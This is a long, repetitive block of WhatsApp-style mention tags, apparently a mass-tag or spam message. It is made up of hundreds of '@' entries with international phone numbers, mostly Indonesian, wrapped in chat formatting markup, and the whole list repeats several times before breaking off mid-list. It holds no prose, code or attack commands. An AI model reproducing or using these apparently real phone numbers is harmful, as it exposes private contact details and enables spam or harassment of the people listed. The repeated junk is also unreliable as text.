~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ 